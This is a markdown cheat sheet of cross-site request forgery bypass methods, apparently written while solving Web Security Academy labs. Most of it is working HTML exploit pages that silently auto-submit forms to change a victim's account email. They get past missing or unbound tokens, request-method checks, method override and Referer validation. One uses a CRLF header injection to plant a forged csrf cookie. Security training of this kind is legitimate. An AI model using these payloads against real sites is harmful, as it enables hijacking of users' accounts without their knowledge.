### CSRF bybass methods
- NO csrf token
- weak csrf token
- check content type
- check referer header

### CSRF token bybass methods
- reomving ANI-csrf token
- NO check for the users token
- weak token
- Reasuable token
- change request method
- Guessable token
- Bybass referer

### method attacks
- remove referer header and send request and check response
- remove original header and send request and check response
- remove csrf  token and send request and check response



### Basic method no defenses
- the request
```
POST /myaccount/changeemail
HOST:


email=....
```

- the exploit
```html
<form action="" method="POST">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>

```
### CSRF where token validation depends on token being present
- the request
```
POST /myaccount/changeemail
HOST:


email=....&csrftoken=.....
```
- TIPS: reomve the csrf token
-THE exploit

```html
<form action="" method="POST">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

### CSRF where token validation depends on request method
- the request
```
POST /myaccount/changeemail
HOST:


email=....&csrftoken=.....
```
- TIPS: reomve the csrf token
- Tips: change request TO GET in CSRF payloads
-THE exploit

```html
<form action="" method="GET">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

### CSRF where token is not tied to user session
- steps                                                                                                                                                                     
1- create two accounts                                                                                                                                                                     
2- go to the first account and change email we will change                                                                                                                                                                     
3- go to second account and try intersept change email then drop request , copy the csrf token                                                                                                                                                                     
4- go to the first account and put csrf token(second account) and try change email is valid or not


### csrf bypass via method override
```
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="" method="GET">
   <input type="hidden" name="_method" value="POST">
   <input type="hidden" name="email" value="">
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```
### CSRF where token is duplicated in cookie
```html
<html>
<body>
   <script>history.pushState(' ',' ','/')</script>
   <form action="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/my-account/change-email" method="POST"/>
   <input type="hidden" name="email" value="a@gmail.com"/>
   <input type="hidden" name="csrf" value="fake"/>
   <input type="submit" value="submit request"/>
   </form>
   <img src="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
   </body>
</html>
```
### CSRF where Referer validation depends on header being present
```html
<html>
<head>
   <meta name="referrer" content="no-referrer" >
</head>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="https://0a390078039fe0a780e435a600ca0059.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="a@gmail.com">
   <input type="submit" value="submit" >
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```

### CSRF with broken Referer validation
```html
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/?0ad4003504bb812580aae57c00c40072.web-security-academy.net')</script>
   <form action="https://0ad4003504bb812580aae57c00c40072.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="a@gmail.com">
   <input type="submit" value="submit" >
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```
